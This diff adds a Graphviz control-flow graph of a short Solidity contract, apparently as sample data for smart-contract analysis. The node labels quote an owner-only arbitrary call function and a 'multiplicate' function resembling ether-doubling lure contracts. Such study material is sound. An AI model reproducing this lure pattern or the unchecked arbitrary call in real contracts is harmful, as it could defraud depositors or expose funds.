@@ -1,0 +1,24 @@
+digraph  {
+13 [label="3_ address public Owner = msg.sender;\n13-new_variable-4-4", method="", type_label=new_variable];
+25 [label="5_ function withdraw()\n    payable\n    public\n    {\n        require(msg.sender == Owner);\n        Owner.transfer(this.balance);\n    }\n25-function_definition-6-12", method="withdraw()", type_label=function_definition];
+30 [label="9_ require(msg.sender == Owner);\n30-expression_statement-10-10", method="withdraw()", type_label=expression_statement];
+39 [label="10_ Owner.transfer(this.balance);\n39-expression_statement-11-11", method="withdraw()", type_label=expression_statement];
+48 [label="12_ function Command(address adr,bytes data)\n    payable\n    public\n    {\n        require(msg.sender == Owner);\n        adr.call.value(msg.value)(data);\n    }\n48-function_definition-13-19", method="Command(address adr,bytes data)", type_label=function_definition];
+61 [label="16_ require(msg.sender == Owner);\n61-expression_statement-17-17", method="Command(address adr,bytes data)", type_label=expression_statement];
+70 [label="17_ adr.call.value(msg.value)(data);\n70-expression_statement-18-18", method="Command(address adr,bytes data)", type_label=expression_statement];
+84 [label="19_ function multiplicate(address adr)\n    public\n    payable\n    {\n        if(msg.value>=this.balance)\n        {        \n            adr.transfer(this.balance+msg.value);\n        }\n    }\n84-function_definition-20-28", method="multiplicate(address adr)", type_label=function_definition];
+93 [label="23_ if_msg.value>=this.balance\n93-if-24-27", method="multiplicate(address adr)", type_label=if];
+203 [label="23_ end_if", method="multiplicate(address adr)", type_label=end_if];
+102 [label="25_ adr.transfer(this.balance+msg.value);\n102-expression_statement-26-26", method="multiplicate(address adr)", type_label=expression_statement];
+1 [label="0_ start_node", method="", type_label=start];
+2 [label="0_ exit_node", method="", type_label=exit];
+25 -> 30  [color=red, controlflow_type=next_line, edge_type=CFG_edge, key=0, label=next_line];
+30 -> 39  [color=red, controlflow_type=next_line, edge_type=CFG_edge, key=0, label=next_line];
+48 -> 61  [color=red, controlflow_type=next_line, edge_type=CFG_edge, key=0, label=next_line];
+61 -> 70  [color=red, controlflow_type=next_line, edge_type=CFG_edge, key=0, label=next_line];
+84 -> 93  [color=red, controlflow_type=next_line, edge_type=CFG_edge, key=0, label=next_line];
+93 -> 102  [color=red, controlflow_type=pos_next, edge_type=CFG_edge, key=0, label=pos_next];
+93 -> 203  [color=red, controlflow_type=neg_next, edge_type=CFG_edge, key=0, label=neg_next];
+203 -> 2  [color=red, controlflow_type=next_line, edge_type=CFG_edge, key=0, label=next_line];
+102 -> 203  [color=red, controlflow_type=end_if, edge_type=CFG_edge, key=0, label=end_if];
+}
